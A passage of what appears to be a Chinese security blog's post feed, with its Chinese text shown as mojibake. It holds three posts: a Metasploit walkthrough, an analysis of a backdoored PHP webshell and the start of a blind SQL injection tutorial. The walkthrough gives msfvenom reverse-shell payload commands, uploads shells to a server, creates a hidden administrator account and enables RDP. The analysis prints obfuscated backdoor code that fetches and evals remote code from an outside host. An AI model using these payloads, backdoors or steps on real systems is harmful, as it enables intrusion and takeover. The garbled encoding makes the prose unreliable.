çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œã€‚ä½†ç›®å‰è¿™ä¸ªé€‰é¡¹åªæ”¯æŒè€ç‰ˆæœ¬çš„windowsç³»ç»Ÿæ¯”å¦‚windows xp MSF Payloadsç”Ÿæˆæ”»å‡»è½½è· Linuxä¸‹åå¼¹Meterpreter shell1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=&lt;your port to connect on&gt; -e -f elf -a x86 --platform linux -o shell Cåå¼¹shellï¼ˆC shellcodeï¼‰1msfvenom -p windows/shell_reverse_tcp LHOST=&lt;your IP Address&gt; LPORT=&lt;your port to connect on&gt; -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c Pythonåå¼¹shell1msfvenom -p cmd/unix/reverse_python LHOST=&lt;your IP Address&gt; LPORT=&lt;your port to connect on&gt; -o shell.py Aspåå¼¹shell1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp Bashåå¼¹shell1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh PHPåå¼¹shell1msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw -o shell.php Windowsåå¼¹shell1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe ä¸Šé¢æ˜¯ä¸€äº›msfvenomå¯ä»¥ç”Ÿæˆçš„æ”»å‡»è½½è· å› ä¸ºæˆ‘ä»¬çš„éœ€è¦ææƒç½‘ç«™æ˜¯phpçš„ï¼Œæ‰€ä»¥å°±éœ€è¦ç”Ÿæˆphpè½½è· å¼€å§‹æˆ‘ä»¬çš„è¡¨æ¼”æŽ¥ä¸‹æ¥å…¨æ˜¯ä¸€äº›çžŽæ“ä½œðŸ˜‚ å°†phpå¤§é©¬ä¸Šä¼ åˆ°æœåŠ¡å™¨æˆ‘è¿™é‡Œå·²ç»ä¸Šä¼ æˆåŠŸäº†ä½†æ˜¯æ‰§è¡Œwhomaiï¼Œnet userå‘½ä»¤æ²¡æœ‰å›žæ˜¾ï¼Œé‚£è¯æ˜Žæƒé™ä¸å¤Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬æ‹¿ç€msfæ¥ææƒæŽ¥ç€æ‰“å¼€parrotosç³»ç»Ÿï¼Œè¿™ä¸ªç³»ç»Ÿå«åšâ€œé¹¦é¹‰â€ï¼Œè·Ÿkaliå·®ä¸å¤šï¼Œæ„Ÿå…´è¶£çš„è‡ªè¡Œè°·æ­Œæ‰§è¡Œå‘½ä»¤ç”Ÿæˆæ”»å‡»è½½è·ï¼š1msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.32.129 LPORT=3333 -f raw -o shell.php shell.phpè¿™ä¸ªè½½è·å·²ç»ç”Ÿæˆå¥½äº†ï¼Œç”Ÿæˆå¥½äº†çš„æ–‡ä»¶åœ¨å½“å‰ç›®å½•ï¼ŒçŽ°åœ¨æˆ‘ä»¬å°†å®ƒä¸Šä¼ åˆ°æœåŠ¡å™¨å·²ç»æˆåŠŸä¸Šä¼ ï¼Œå½“ç„¶ï¼Œå…‰è¿™æ ·æ˜¯ä¸å¤Ÿçš„ï¼ŒçŽ°åœ¨åˆ‡æ¢åˆ°parrotosè™šæ‹Ÿæœºç³»ç»Ÿæˆ‘ä»¬éœ€è¦åŽ»æ‰§è¡Œä¸€äº›æ¼æ´žåˆ©ç”¨æ¨¡å—åœ¨å‘½ä»¤è¡Œçª—å£è¾“å…¥msfconsoleå°±å¯ä»¥è¿›å…¥metasploitäº†12345678â”Œâ”€[root@parrot]â”€[~]â””â”€â”€â•¼ # msfconsole //è¾“å…¥è¿™æ¡å‘½ä»¤msf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp //è®¾ç½®payloadmsf exploit(multi/handler) &gt; show options //æ˜¾ç¤ºé€‰é¡¹msf exploit(multi/handler) &gt; set LHOST 192.168.32.129 //è®¾ç½®ipåœ°å€ï¼Œæ³¨æ„ï¼Œè¿™ä¸ªè¦ä¸Žä¸Šé¢æ”»å‡»è½½è·é‡Œé¢çš„ç›¸åŒmsf exploit(multi/handler) &gt; set LPORT 3333 //è®¾ç½®ç«¯å£ï¼Œè¿™ä¸ªä¹Ÿè¦ç›¸åŒmsf exploit(multi/handler) &gt; exploit //æ‰§è¡Œæ”»å‡» çŽ°åœ¨parrotosç³»ç»Ÿè¿™è¾¹æ­£åœ¨ç›‘å¬ä¸­ï¼Œæˆ‘ä»¬çŽ°åœ¨åªéœ€è¦åŽ»æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„phpæ–‡ä»¶ï¼Œåœ¨ä»»æ„ç³»ç»Ÿä¸­æ‰“å¼€é‚£ä¸ªshell.phpç½‘é¡µå³å¯è§¦å‘çœ‹åˆ° meterpreter&gt; å°±å·²ç»åå¼¹äº†ä¸€ä¸ªshelläº†ï¼ŒæŽ¥ç€è¾“å…¥ç›´æŽ¥è¾“å…¥getuid123meterpreter &gt; getuid Server username: Administrator (0) //çœ‹åˆ°è¿™ä¸ªåœ°æ–¹æ˜¯administratorå°±æˆåŠŸäº†ï¼Œæˆ‘ä»¬å·²ç»æœ‰äº†è¶…çº§ç®¡ç†å‘˜æƒé™äº†meterpreter &gt; ç›´æŽ¥è¾“å…¥shellå¯ä»¥è¿›å…¥bashç»ˆç«¯1234567meterpreter &gt; shellProcess 660 created.Channel 0 created.Microsoft Windows [ï¿½æ±¾ 5.2.3790](C) ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ 1985-2003 Microsoft Corp.C:\phpStudy\WWW\webpentest\varcov&gt; è®°å½•è¿™ä¸ªä½ç½®C:\phpStudy\WWW\webpentest\varcov&gt;æ²¡æžæ‡‚ä¸ºä»€ä¹ˆåœ¨è¾“å…¥shellåŽæ‰§è¡Œnet userç±»ä¼¼çš„å‘½ä»¤ä¸ºä»€ä¹ˆä¼šæ–­å¼€è¿žæŽ¥ï¼Œæœ‰å“ªä½å¤§ä½¬çœ‹åˆ°æ˜¯å¦å¯ä»¥å¸®å¿™è§£é‡Šä¸€ä¸‹1234Terminate channel 0? [y/N] y[-] Error running command shell: Rex::TimeoutError Operation timed out.meterpreter &gt; [*] 192.168.32.143 - Meterpreter session 2 closed. Reason: Died çœ‹åˆ°ä¸Šé¢å‡ºé—®é¢˜äº†ï¼Œéš¾é“æ²¡æˆäº†å—ï¼Œå½“ç„¶ä¸æ˜¯äº†ï¼Œmeterpreter&gt;é‚£ä¸ªç•Œé¢çš„åŠŸèƒ½å·²ç»å¤Ÿæˆ‘ä»¬ç”¨äº† ç”±äºŽæˆ‘çš„phpå¤§é©¬æ”¯æŒcmdå‘½ä»¤æ‰§è¡Œï¼Œæžœæ–­çš„ä»Žæ–°ç”Ÿæˆäº†ä¸€ä¸ªexeæ–‡ä»¶ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.32.129 LPORT=4444 -f exe -a x86 --platform win -o shell.exe ç”Ÿæˆäº†shell.exeï¼ŒçŽ°åœ¨è¯•ç€ç”¨å…¶ä»–æ–¹æ³•ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œæˆ‘ä»¬åœ¨æ‰§è¡Œä¸€æ¬¡phpæ–‡ä»¶ï¼Œç„¶åŽparrotosç³»ç»Ÿè¿™è¾¹åˆç›‘å¬åˆ°äº†ä¸€ä¸ªä¼šè¯ï¼Œç›´æŽ¥è¿žæŽ¥è¿›åŽ»æŽ¥ç€ç›´æŽ¥uploadä¸Šä¼ æ–‡ä»¶å³å¯12345678[*] Started reverse TCP handler on 192.168.32.129:3333 [*] Sending stage (37543 bytes) to 192.168.32.143[*] Meterpreter session 4 opened (192.168.32.129:3333 -&gt; 192.168.32.143:1096) at 2018-04-20 21:18:56 +0800 //é‡æ–°è¿žæŽ¥æˆåŠŸmeterpreter &gt; upload shell.exe C:\\phpStudy\\WWW\\webpentest\\varcov\ //è¿™ä¸ªä½ç½®ä¸Šé¢å·²ç»è¯´åˆ°è¿‡ï¼Œä¸Šä¼ åˆ°è¿™ä¸ªä½ç½®å³å¯[*] uploading : shell.exe -&gt; C:\phpStudy\WWW\webpentest\varcov\[*] uploaded : shell.exe -&gt; C:\phpStudy\WWW\webpentest\varcov\\shell.exemeterpreter &gt; okï¼Œä¸Šä¼ æˆåŠŸï¼Œå› ä¸ºç”Ÿæˆçš„exeæ–‡ä»¶æ˜¯ç”¨çš„ä¸€ä¸ªæ–°ç«¯å£ï¼Œå¹¶ä¸”payloadæ˜¯windows/meterpereter/reverse_tcpï¼Œæ‰€ä»¥è¿”å›žé‡æ–°è®¾ç½®å³å¯12345msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lport 4444lport =&gt; 4444msf exploit(multi/handler) &gt; exploit //æ‰§è¡Œ å®Œæˆä¸Šé¢æ“ä½œåŽï¼Œæ¥åˆ°phpå¤§é©¬åœ¨å‘½ä»¤æ‰§è¡Œä¸­å†™å…¥è·¯å¾„å³å¯C:\phpStudy\WWW\webpentest\varcov\shell.exeç”±äºŽæ˜¯windowsç³»ç»Ÿï¼Œæ‰€ä»¥æ³¨æ„æ–œæ é—®é¢˜ï¼Œwindowsçš„æ˜¯åæ–œæ â€\â€ æŽ¥ç€ææƒï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546meterpreter &gt; getuidServer username: AA-C86AD57B48D6\Administrator //çœ‹åˆ°è¿™ä¸ªä½ç½®çš„administratorè·Ÿä¸Šé¢phpå¾—çš„ä¸ä¸€æ ·ï¼Œæ„Ÿè§‰é‚£ä¸ªå¯èƒ½æ˜¯ä¸€ä¸ªå‡çš„æƒé™meterpreter &gt; shell //è¿›å…¥bashç»ˆç«¯Process 3300 created.Channel 1 created.Microsoft Windows [ï¿½æ±¾ 5.2.3790](C) ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ 1985-2003 Microsoft Corp.C:\phpStudy\WWW\webpentest\varcov&gt;net user //æ‰§è¡Œnet userå‘½ä»¤æ²¡æœ‰å‘çŽ°adminç”¨æˆ·net user\\AA-C86AD57B48D6 ï¿½ï¿½ï¿½Ã»ï¿½ï¿½Ê»ï¿½-------------------------------------------------------------------------------Administrator ASPNET Guest IUSR_AA-C86AD57B48D6 IWAM_AA-C86AD57B48D6 SUPPORT_388945a0 ï¿½ï¿½ï¿½ï¿½ï¿½É¹ï¿½ï¿½ï¿½ï¿½É¡ï¿½C:\phpStudy\WWW\webpentest\varcov&gt;net user admin admin /add //åˆ›å»ºä¸€ä¸ªadminç”¨æˆ·net user admin admin /addï¿½ï¿½ï¿½ï¿½ï¿½É¹ï¿½ï¿½ï¿½ï¿½É¡ï¿½C:\phpStudy\WWW\webpentest\varcov&gt;net localgroup administrators admin /add //ææƒnet localgroup administrators admin /addï¿½ï¿½ï¿½ï¿½ï¿½É¹ï¿½ï¿½ï¿½ï¿½É¡ï¿½C:\phpStudy\WWW\webpentest\varcov&gt;net user admin //adminç”¨æˆ·çš„ä¿¡æ¯net user adminï¿½Ã»ï¿½ï¿½ï¿½ adminæ­¤å¤„çœç•¥ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ô± *Administrators *Users //çœ‹åˆ°è¿™ä¸ªåœ°æ–¹æœ‰Administratorç”¨æˆ·ç»„å°±æˆåŠŸäº†C:\phpStudy\WWW\webpentest\varcov&gt;exit //é€€å‡ºbashç»ˆç«¯exit//æƒé™æœ‰äº†ï¼Œ3389æ²¡å¼€ï¼Œæˆ‘ç›´æŽ¥ç”¨è¿™ä¸ªå¼€å§ï¼ï¼ï¼meterpreter &gt; run getgui -e //å¼€å¯3389ç«¯å£[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.[!] Example: run post/windows/manage/enable_rdp OPTION=value [...][*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator[*] Carlos Perez carlos_perez@darkoperator.com[*] Enabling Remote Desktop[*] RDP is disabled; enabling it ...[*] Setting Terminal Services service startup mode[*] The Terminal Services service is not set to auto, changing it to auto ...[*] Opening port in local firewall if necessary[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180420.5422.rcmeterpreter &gt; 3389ç«¯å£ä¹Ÿå·²ç»å¼€å¯äº†ï¼ŒæŽ¥ä¸‹æ¥æ‹¿æˆ‘ä»¬çš„win10åŽ»è¿žæŽ¥å³å¯ å¤§æ¦‚å°±è¿™ä¹ˆå¤šäº†å§ï¼Œä¸‹æ¬¡æœ‰æ—¶é—´å†™ä¸€ä¸ªmetasploitçš„ä½¿ç”¨ï¼Œè¿™ä¸ªæ¡†æž¶è¿˜æ˜¯æ¯”è¾ƒç‰›é€¼çš„]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPå¤§é©¬åŽé—¨åˆ†æž]]></title>
    <url>%2F2018%2F04%2F11%2FPHP%E5%A4%A7%E9%A9%AC%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[å½“ç„¶ï¼Œè¿™ä¸ªå¤§é©¬æ˜¯èƒ½ç”¨çš„ï¼Œè¿‡äº†å‡ å¤©ï¼Œæˆ‘å°±å¼€å§‹ç ”ç©¶èµ·æ¥äº†è¿™ä¸ªå¤§é©¬ è§£å†³ç¼–ç é—®é¢˜é‚£ä¹ˆï¼Œnotepad++æ‰“å¼€ï¼ˆæˆ‘åªæœ‰è¿™ä¸ªå“ˆï¼‰ï¼Œå‘çŽ°ä»£ç ä½¿ç”¨chr()è¿›è¡Œç¼–ç ï¼Œchræ˜¯phpçš„ä¸€ä¸ªå‡½æ•°ï¼Œä»–ä»Žä¸åŒçš„ ASCII å€¼è¿”å›žå­—ç¬¦ï¼Œåˆšå¥½ï¼Œæˆ‘è¿™é‡Œçš„chréƒ½æ˜¯åŒ…è£¹ç€asciiç çš„ï¼Œç¼–ç æ–¹å¼ä¹ŸçŸ¥é“æˆ‘è¿˜æ˜¯æŠŠå¤§é©¬å†…å®¹æ‹¿å‡ºæ¥å§ï¼š12345678910111213141516171819&lt;?php$admin['check'] = false;$password = 'admin';//è®¾ç½®å¯†ç $c = "chr";session_start();if (empty($_SESSION['PhpCode'])) &#123; $url = $c(104).$c(116).$c(116).$c(112).$c(58).$c(47).$c(47); $url .= $c(119).$c(119).$c(119).$c(46).$c(97).$c(52).$c(52); $url .= $c(57).$c(52).$c(52).$c(46).$c(99).$c(111).$c(109).$c(47); $url .= $c(112).$c(104).$c(112).$c(46).$c(106).$c(112).$c(103); $get = chr(102) . chr(105) . chr(108) . chr(101) . chr(95); $get .= chr(103) . chr(101) . chr(116) . chr(95) . chr(99); $get .= chr(111) . chr(110) . chr(116) . chr(101) . chr(110); $get .= chr(116) . chr(115); $_SESSION['PhpCode'] = $get($url);&#125;$unzip = $c(103) . $c(122) . $c(105) . $c(110);$unzip .= $c(102) . $c(108) . $c(97) . $c(116) . $c(101);@eval($unzip($_SESSION['PhpCode'])); ç»†å¿ƒä¸€ç‚¹çš„åŒå­¦ä¼šå‘çŽ°é—®é¢˜ï¼Œè¿™ä¸ªphpä»£ç æœ€åŽä¸€æŽ’æ€Žä¹ˆå°‘äº†?&gt; ç¬¦å·å‘¢ï¼Ÿé‚£ä¹ˆæˆ‘ä»¬æ¥æ…¢æ…¢å¼€å§‹è¯»ä»£ç ï¼Œçœ‹åˆ°é‚£ä¸ª$c = â€œchrâ€;ç„¶åŽä¸‹é¢æœ‰ä¸€ä¸ªï¼šsession_start(); å½“ç„¶ï¼Œè¿™ä¸ªæˆ‘ä¹Ÿä¸å¤ªçŸ¥é“æ˜¯å¹²å˜›ç”¨çš„ï¼Œæ¯•ç«Ÿä¸ä¼šphpï¼Œå¥½åƒæ˜¯å¯åŠ¨ä¼šè¯ï¼ŒSession çš„å·¥ä½œæœºåˆ¶æ˜¯ï¼šä¸ºæ¯ä¸ªè®¿é—®è€…åˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„ id (UID)ï¼Œå¹¶åŸºäºŽè¿™ä¸ª UID æ¥å­˜å‚¨å˜é‡ã€‚UID å­˜å‚¨åœ¨ cookie ä¸­ï¼Œäº¦æˆ–é€šè¿‡ URL è¿›è¡Œä¼ å¯¼ã€‚ä»–å¯ä»¥å­˜å‚¨å’Œå–å›žsessionå˜é‡ï¼Œå…·ä½“å¤§å®¶è¿˜æ˜¯ç™¾åº¦ä¸€ä¸‹è¿™ä¸ªå§ã€‚æŽ¥ä¸‹æ¥ï¼Œä¸€ä¸ªifè¯­å¥ï¼Œåˆ¤æ–­è¿™ä¸ªæ˜¯å¦æœ‰å–å›žçš„sessionå˜é‡ï¼Œå½“ç„¶ï¼Œæ‰§è¡Œåˆ°è¿™ä¸€æ­¥ï¼Œå¹¶æ²¡æœ‰åŽé¢é‚£ä¸ªphpcodeï¼Œæ‰€ä»¥ç›´æŽ¥æ‰§è¡Œifè¯­å¥c=chrï¼Œæ‹¿å‡ºæˆ‘ä»¬çš„asciiè¡¨å¯¹åº”ï¼Œå‘çŽ°104=hï¼Œ116=tï¼Œé‚£å°±ä¸ç”¨çŒœäº†ï¼Œè¿™åº”è¯¥æ˜¯ä¸€ä¸ªç½‘å€ï¼ŒæŽ¥ç€ï¼Œä¸ºäº†èƒ½é©¬ä¸Šå¾—å‡ºç»“æžœï¼Œæ‰“å¼€pycharmå†™äº†ä¸€ä¸ªæ­£åˆ™åŠ forå¾ªçŽ¯çš„ä»£ç ï¼Œä¸€å…±å¤§æ¦‚6è¡Œä»£ç ï¼Œç„¶åŽç›´æŽ¥å°†åŽé¢çš„å†…å®¹ç¿»è¯‘å‡ºæ¥äº†ï¼Œ123456import restring = "$c(104).$c(116).$c(116).$c(112).$c(58).$c(47).$c(47)$c(119).$c(119).$c(119).$c(46).$c(97).$c(52).$c(52);$c(57)" \ ".$c(52).$c(52).$c(46).$c(99).$c(111).$c(109).$c(47);$c(112).$c(104).$c(112).$c(46).$c(106).$c(112).$c(103);"result = re.findall(r'(\w*[0-9]+\w*)', string)for line in result: print(chr(int(line)), end="") å¤§æ¦‚å°±è¿™æ ·å§ï¼Œè¾“å‡ºç»“æžœï¼šhttp://www.a44944.com/php.jpgï¼Œ æ²¡é”™ï¼Œçš„ç¡®æ˜¯ä¸€ä¸ªç½‘å€ï¼Œæˆ‘ä»¬è¿žæŽ¥çš„æ˜¯ä¸€å¼ å›¾ç‰‡é‚£ä»–æ˜¯æ€Žä¹ˆè¿žæŽ¥çš„å‘¢æˆ‘æŠŠ$getå’Œ$unzipé‡Œé¢çš„å†…å®¹æ‹¿åŽ»pythoné‡Œé¢è¿è¡Œäº†ä¸€ä¸‹ï¼Œ$get=file_get_contentså‡½æ•°,$unzip=gzinflateå‡½æ•°$_SESSION[â€˜PhpCodeâ€™] = $get($url);å°±æˆäº†$_SESSION[â€˜PhpCodeâ€™] = file_get_contents(http://www.a44944.com/php.jpg);æœ€åŽä¸€æŽ’çš„gzinflateå‡½æ•°å°±åŽ»è§£åŽ‹å‰é¢çš„å†…å®¹ï¼Œå¥½åƒä»–ä»¬æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ç”¨evalåŽ»æ‰§è¡Œï¼Œå°±æ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬ç†è§£äº†åŽŸç†ï¼Œéš¾æ€ªå®ƒåªæœ‰è¿™ä¹ˆå‡ è¡Œä»£ç  æŸ¥çœ‹å›¾ç‰‡å†…å®¹ç½‘å€æœ‰äº†ï¼Œæ‰“å¼€æµè§ˆå™¨ï¼ŒåŽ»åœ°å€æ è®¿é—®è¿™ä¸ªç½‘å€ï¼Œæ²¡é”™ï¼Œæ˜¯ä¸€æ ·æŸåäº†çš„å›¾ç‰‡ï¼Œè¿™å°±åŸºæœ¬çš„è‚¯å®šäº†è¿™ä¸ªå›¾ç‰‡é‡Œé¢æœ‰æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ï¼Œåº”è¯¥å°±æ˜¯phpä»£ç å§ï¼Œæˆ‘ç›´æŽ¥å°†å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œç”¨notepad++æ‰“å¼€ï¼Œç»“æžœä¹±ç ï¼Œæ”¹ä¸ºtxtæ–‡ä»¶ï¼Œè¿˜æ˜¯ä¹±ç æƒ³èµ·æ¥å¥½åƒä»–è¿™ä¸ªåœ¨æˆ‘ä»¬è¿žæŽ¥æ—¶ä½¿ç”¨äº†gzinflateå‡½æ•°è¿›è¡Œè§£åŽ‹ï¼Œæ‰€ä»¥ä»–åº”è¯¥æ˜¯è¢«åŽ‹ç¼©äº†çš„ï¼Œä¸ºäº†èƒ½å¤Ÿçœ‹ç€å¾ˆæ–¹ä¾¿æˆ‘ç›´æŽ¥ä»Žæ–°å†™äº†ä¸€ä¸ªphp123456&lt;?phpsession_start();$url = "http://127.0.0.1/webpentest/upload/upload/php.jpg"; //è¿™é‡Œæˆ‘å°†è¿™ä¸ªå›¾ç‰‡ä¸‹è½½ä¸‹æ¥äº†çš„ï¼Œæ‰€ä»¥è¿žæŽ¥çš„æœ¬åœ°çš„$get = "file_get_contents";$_SESSION['PhpCode'] = $get($url);echo(gzinflate($_SESSION['PhpCode'])); ç›´æŽ¥åŽ»è¿žæŽ¥ï¼Œä½†æ˜¯ä¸æ‰§è¡Œäº†evaläº†ï¼Œç›´æŽ¥ç”¨echoè¾“å‡ºï¼Œçœ‹åˆ°å‰é¢çš„$_SESSIONäº§ç”Ÿäº†ä¸€ä¸ªä¼šè¯ï¼ŒæˆåŠŸåŽç”¨gzinflateåŽ»è§£åŽ‹ï¼Œç”¨echoè¾“å‡ºç»“æžœï¼Œæˆ‘ä»¬è¦çš„ä»£ç å°±è¿™æ ·å‡ºæ¥äº†ï¼Œä½†æ˜¯ä»£ç å‡ºæ¥åŽå‘çŽ°å¾ˆå¥‡æ€ªï¼Œå‰é¢å‡ è¡Œæ²¡é—®é¢˜ï¼Œä½†æ˜¯å‘çŽ°åŽé¢åˆå…¨æ˜¯ä¹±ç åˆè¦æ…¢æ…¢å¼€å§‹è¯»ä»£ç äº†ï¼Œå¤ªä¹±äº†ï¼ŒæŒ‰äº†ctrl+uï¼ŒæŸ¥çœ‹æºä»£ç ä¸€æ‰“å¼€ï¼Œå°±çœ‹åˆ°äº†è¿™å¥ï¼š1e'.'v'.'a'.'l(g'.'z'.'un'.'co'.'mp'.'re'.'ss(bas'.'e64_'.'deco'.'de(\'eJzs/fl7HNd1J4z/TD+...... åˆäº†evalï¼Œéšä¾¿çž„äº†ä¸€çœ¼åŽé¢çš„å‡½æ•°ï¼Œåˆäº†æ‹¼æŽ¥ï¼Œä¸»è¦å°±æ˜¯çœ‹åˆ°äº†base64_decodeï¼ŒåŽŸæ¥æ˜¯base64åŠ å¯†ï¼Œæžœæ–­çš„å°†evalæ”¹ä¸ºäº†echoï¼Œå‘çŽ°ä¸èƒ½è¾“å‡ºï¼Œçº³é—·äº†ï¼Œæ€Žä¹ˆä¸è¡Œï¼Œåˆå¼€å§‹æ‰¾åŽŸå› è¯•äº†è¯•å°†æ‰€æœ‰ä»£ç å…¨éƒ¨ä¿å­˜å‡ºæ¥ï¼ŒæŽ¥ç€ç”¨è§£å¯†ä»£ç è¯•è¯•èƒ½ä¸èƒ½è§£å‡ºbase6412345678910&lt;?php$Code = 'è¿™ä¸ªåœ°æ–¹æ”¾base64_decodeåŠ å¯†çš„ä»£ç ';$File = 'decoded.php';//è§£ç åŽä¿å­˜çš„æ–‡ä»¶$Temp = base64_decode($Code);$temp = gzuncompress($Temp);$FP = fopen($File,"w");fwrite($FP,$temp);fclose($FP);echo"è§£å¯†æˆåŠŸï¼";?&gt; å½“ç„¶ï¼Œæˆ‘æ¯«ä¸çŠ¹è±«çš„å°†ä¹±ç å¤åˆ¶åˆ°äº†è¿™ä¸ªé‡Œé¢ï¼Œçœ‹åˆ°å½“å‰ç›®å½•æ–°å¢žäº†ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™å›žå¯¹äº†ï¼Œåº”è¯¥å‡ºæ¥äº†ï¼Œæ‰“å¼€ä¸€çœ‹ï¼Œphpå¤§é©¬å†…å®¹å‘ˆçŽ°å‡ºæ¥äº†ï¼Œå¤§æ¦‚å°±è¿™ä¹ˆå¤šå§ï¼Œæ²¡ä»€ä¹ˆæŠ€æœ¯å«é‡ï¼Œä½†æ˜¯è¦ç»†å¿ƒï¼Œä¸æ‡‚çš„é©¬ä¸Šè°·æ­Œç™¾åº¦ï¼Œæ¯”å¦‚æˆ‘åœ¨ä¸­é€”å°±å°†gzuncompressçœ‹æˆäº†gzinflateå‡½æ•°ï¼Œç„¶åŽå¯¼è‡´ä¸­é€”å‡ºçŽ°äº†å¾ˆå¤šæ„å¤–ï¼ŒæŽ¥ä¸‹æ¥æˆ‘å°±å¼€å§‹äº†æ…¢æ…¢æ‰¾è¿™ä¸ªphpå¤§é©¬é‡Œé¢æ˜¯å¦è¿˜æœ‰åŽé—¨äº†ï¼Œæ¯•ç«ŸçŽ°åœ¨é»‘åƒé»‘çœŸçš„ä¸å°‘ï¼Œæ²¡äººæ„¿æ„å°†è‡ªå·±å†™äº†å‡ ä¸ªå°æ—¶ï¼Œç”šè‡³å‡ å¤©çš„é©¬éšä¾¿æ‰”å‡ºæ¥ç»™å…¶ä»–äººç”¨ã€‚]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>PHPå¤§é©¬</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlæ³¨å…¥ä¹‹ç›²æ³¨æ”»å‡»]]></title>
    <url>%2F2018%2F04%2F04%2Fsql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[åœ¨æˆ‘ä»¬å­¦ä¹ ç›²æ³¨æ—¶ï¼Œéœ€è¦æ³¨æ„çš„äº‹æƒ…æ˜¯ç›²æ³¨åŸºäºŽtrueå’Œfalseï¼Œå³0å’Œ1ï¼ŒçœŸè¿”å›ž1ï¼Œå‡è¿”å›ž0ä¸€ä¸ªç®€å•çš„å°æµ‹è¯•ï¼Œæ•°æ®åº“æ˜¯sqlinï¼Œæˆ‘ä»¬æ¥åˆ¤æ–­æ•°æ®åº“å­—ç¬¦è¿”å›žå€¼æ˜¯å¦ä¸º0æˆ–1ï¼š12345678910111213141516171819202122232425262728293031mysql&gt; select mid(database(),1,1)='s';+-------------------------+| mid(database(),1,1)='s' |+-------------------------+| 1 |+-------------------------+1 row in set (0.00 sec)mysql&gt; select mid(database(),1,1)='r';+-------------------------+| mid(database(),1,1)='r' |+-------------------------+| 0 |+-------------------------+1 row in set (0.00 sec)mysql&gt; select database() regexp '^[a-z]';+----------------------------+| database() regexp '^[a-z]' |+----------------------------+| 1 |+----------------------------+1 row in set (0.00 sec)mysql&gt; select database() regexp '^[1-10]';+-----------------------------+| database() regexp '^[1-10]' |+-----------------------------+| 0 |+-----------------------------+1 row in set (0.00 sec) å¸¸ç”¨çš„ç›²æ³¨å‡½æ•° if æ¡ä»¶ä¸ºçœŸæ‰§è¡Œï¼Œåä¹‹ä¸æ‰§è¡Œç‚¹å‡»è·³è½¬ if(æ¡ä»¶,æ‰§è¡Œ(true),ä¸æ‰§è¡Œ(false)) sleep æ‰§è¡Œå»¶æ—¶numberç§’ç‚¹å‡»è·³è½¬ sleep(number) length ç»Ÿè®¡å­—ç¬¦ä¸²çš„é•¿åº¦ç‚¹å‡»è·³è½¬ length(number) mid,substr æˆªå–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ç‚¹å‡»è·³è½¬ mid(å­—æ®µ,èµ·å§‹ä½ç½®(number),é•¿åº¦(number)) ORD è¿”å›žç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²çš„ASCIIç ç‚¹å‡»è·³è½¬ ord(x) left å¾—åˆ°å­—ç¬¦ä¸²å·¦éƒ¨æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦ç‚¹å‡»è·³è½¬ left(string,number) regexp æ­£åˆ™æ³¨å…¥ç‚¹å‡»è·³è½¬ regexp â€˜^[a-z]â€™ åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­ regexp â€˜^râ€™ åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºr regexp â€˜^r[a-z]â€™ åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­ like åŒ¹é…æ³¨å…¥ç‚¹å‡»è·³è½¬ ç™¾åˆ†æ¯”(%)é€šé…ç¬¦å…è®¸åŒ¹é…ä»»ä½•å­—ç¬¦ä¸²çš„é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚ ä¸‹åˆ’çº¿(_)é€šé…ç¬¦å…è®¸åŒ¹é…ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚ like â€˜r%â€™ 